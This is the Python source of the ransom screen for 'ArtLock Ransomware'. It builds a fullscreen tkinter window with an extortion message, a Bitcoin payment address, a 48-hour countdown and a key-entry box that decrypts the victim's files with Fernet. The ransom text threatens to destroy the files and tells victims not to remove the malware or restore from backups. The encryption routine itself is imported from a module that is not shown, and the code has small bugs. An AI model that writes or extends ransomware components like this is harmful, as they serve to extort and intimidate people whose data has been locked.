import tkinter as tk
from tkinter import *
import threading
from tkinter import ttk
from tkinter import messagebox as MessageBox
from PIL import Image, ImageTk
from cryptography.fernet import Fernet
import sys
import os
from termcolor import colored
import allfiles1
import signal


class Root(tk.Tk):
    def __init__(self, title):
        super().__init__()
        self.title(title)
        self.width = self.winfo_screenwidth()
        self.height = self.winfo_screenheight()
        self.attributes('-fullscreen', True)
        self.bind("<FocusIn>", self.on_focus_in)
        self.bind('<Return>', self.file_decrypt)

        self.create_layout()
        self.create_widgets()

        # Start the timer
        self.start_timer(48 * 3600)  # 48 hours in seconds
        self.mainloop()

    def create_layout(self):
        # Define frames as self attributes so they can be accessed elsewhere
        self.frame0 = tk.Frame(self, width=self.width, height=self.height / 2, bg="black", borderwidth=20)
        self.frame0.pack_propagate(False)

        self.frame1 = ttk.Frame(self, width=self.width, height=self.height / 2)
        self.frame1.pack_propagate(False)

        self.frame0.pack()
        self.frame1.pack()

    def create_widgets(self):
        # Title
        h_one = ttk.Label(self.frame0, text="ArtLock Ransomware", font=("sans-serif", 50, "normal"))
        h_one.grid(row=0, column=1, padx=5, pady=5, sticky='nswe')
        h_one.config(foreground='white', background='black')
        h_one.pack()

        # Image
        image1 = Image.open("image.jpg")
        imageR = ImageTk.PhotoImage(image1)
        label1 = tk.Label(self.frame0, image=imageR, width=400, height=250)
        label1.image = imageR  # Keep a reference to avoid garbage collection
        label1.place(relx=0.5, rely=0.5, anchor="center")

        # Subtitle
        subtitle = ttk.Label(self.frame0, text="Your system has been encrypted", font=("sans-serif", 16, "normal"))
        subtitle.place(relx=0.5, rely=0.9, anchor="center")
        subtitle.config(foreground='white', background='black')

        # Key to decode entry
        self.key_entry = StringVar()
        self.val_key_entry = tk.Entry(
            self.frame0,
            textvariable=self.key_entry,
            width=60,
            bg="white",
            fg="black",
            font=("Arial", 12),
            bd=2,
            insertwidth=2,  # Grosor del cursor
            insertbackground="black",  # Color del cursor
            highlightthickness=2,  # Grosor del borde cuando el Entry tiene foco
            highlightcolor="blue"  # Color del borde cuando el Entry tiene foco
        )
        self.val_key_entry.place(relx=0.52, rely=1, anchor="center")

        insert_key = tk.Label(self.frame0, text="Insert the key to decrypt all your files", fg="white", bg="black",
                              font=("sans-serif", 12, "normal"))
        insert_key.place(relx=0.25, rely=1, anchor="center")

        button_to_send_key = ttk.Button(self.frame0, text="Send", command=self.file_decrypt)
        button_to_send_key.place(relx=0.74, rely=1, anchor="center")

        # Ransom message
        ransom_message = """
        ATTENTION!

        All your personal files, documents, photos, databases, and other important data have been ENCRYPTED and are no longer accessible. This is the result of an infection by the ArtLock Ransomware.

        What does this mean?
        Your files have been locked using advanced encryption. You will not be able to access or recover them without the decryption key.

        What must I do to recover my files?
        You must make a payment to receive the decryption key.

        WARNING:
        If the payment is not made within 2 days, your files may be permanently destroyed.
        Do not attempt to remove the malware or restore from backups.

        Act quickly to restore your data!
        """

        # Warning message
        adv = tk.Label(self.frame1, text=ransom_message, font=("Arial", 12), justify="center", anchor="center")
        adv.place(relx=0.5, rely=0.37, anchor="center", width=self.width, height=self.height)
        adv.config(foreground='white', background='black')

        bitcoin_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        # Bitcoin address
        address_label = tk.Label(self.frame1, text=f"Pay to Bitcoin Address: {bitcoin_address}", font=("Arial", 14),
                                 bg='black', fg='red', justify='center')
        address_label.place(relx=0.5, rely=0.8, anchor="center")

        # Timer label
        self.timer_label = tk.Label(self.frame1, font=("Arial", 16), bg='black', fg='yellow')
        self.timer_label.place(relx=0.5, rely=0.9, anchor="center")

    def start_timer(self, countdown):
        if countdown >= 0:
            hours, remainder = divmod(countdown, 3600)
            minutes, seconds = divmod(remainder, 60)
            self.timer_label.config(text=f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}")
            self.after(1000, self.start_timer, countdown - 1)
        else:
            self.timer_label.config(text="TIME IS UP!")

    def file_decrypt(self):
        insert_key = self.val_key_entry.get()
        true_key = return_key()
        fernet = Fernet(true_key)
        true_key_dec = true_key.decode('utf-8')

        if insert_key == true_key_dec:
            try:
                for filepath in files:
                    with open(filepath, "rb") as file:
                        data_to_decrypt = file.read()
                    data = fernet.decrypt(data_to_decrypt)

                    with open(filepath, "wb") as file:
                        file.write(data)
                print(colored(f"\n[!] All your files have been restored", "green"))
                MessageBox.showinfo("Alert", "[*] Files successfully decrypted")
                self.destroy()  # Close the app
            except Exception as e:
                pass
        else:
            print(colored(f"\n[!] Incorrect key", "red"))
            MessageBox.showinfo("Alert", "[*] Incorrect Key")
            self.val_key_entry.set("")

    def on_focus_in(self, event):
        self.val_key_entry.focus_set()


def def_handler(sig, frame):
    print(colored(f"\n[!] Exiting...\n", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def return_key():
    return open('key.key', 'rb').read()



